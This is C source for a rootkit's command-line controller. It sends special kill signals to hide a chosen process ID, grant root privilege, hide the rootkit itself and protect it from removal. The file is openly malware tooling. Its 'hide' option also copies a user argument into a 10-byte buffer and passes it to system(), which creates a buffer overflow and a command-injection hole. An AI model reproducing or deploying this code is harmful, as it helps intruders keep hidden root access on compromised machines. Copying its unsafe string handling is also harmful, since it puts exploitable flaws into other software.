#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void printHelp() {
	printf("[INCOGNITO COMMANDS]...\n");
	printf("-----------------------------------------\n");
	printf("protect:           Toggles rootkit removal protection\n");
	printf("help:              Shows this help menu\n");
	printf("hide [PID]:        Toggles hiding the specified [PID]/\n");
	printf("incognito:         Toggles hiding and protection of the rootkit\n");
	printf("root:              Grants root privelege \n");
	printf("To enter a command, type './command [type command here]'\n");
}

void runTestMode(void){
	int code = 0;
	printf("Incognito Commander is now in test mode!\n"
	"It will run until 1337 is entered!\n"
	"This is to demonstrate the pid hiding capabilties!\n"
	"Put it in the bg and hide it!\n"
	"To disable enter the code: 1337\n");
	while (code != 1337){
		scanf("%d", &code);
	}
}

void main(int argc, char *argv[]) {

	int error = 0;

	// User did not provide an option
	if(argc < 2) {
		printf("Error, must give an option! \n");
		error = 1;
	}
	// User provided too many options
	else if(argc > 3) {
		printf("Error, must enter only one option! \n");
		error = 1;
	}

	// User entered 2 arguments
	else if(argc == 3) {

		// Check whether they entered "Hide [pid]" option
		int option31 = strcmp("hide", argv[1]);
		if(option31 == 0) {

			// Issue system command to hide specified process
			char sys_command[10];
			char option[10];

			strcpy(sys_command, "kill ");
			strcpy(option, "-31 ");

			strcat(option, argv[2]);
			strcat(sys_command, option);
			system(sys_command);
		}

	}

	else {
		// Check for other options
		int option1 = strcmp("protect", argv[1]);
		int option2 = strcmp("help", argv[1]);
		int option63 = strcmp("incognito", argv[1]);
		int option64 = strcmp("root", argv[1]);
		int optionTest = strcmp("test", argv[1]);

		if(option1 == 0) {
			system("kill -1 0");
		}
		if(option2 == 0) {
			printHelp();
		}

		if(option63 == 0) {
			system("kill -63 0");
		}
		if(option64 == 0) {
			system("kill -64 0");
		}
		if (optionTest == 0){
			runTestMode();
		}

	}

	printf("%s", "\n");

	if(error == 0) {
		printf("%s", "Command performed.\n");
	}
	else {
		printf("%s", "\n");
	}


}
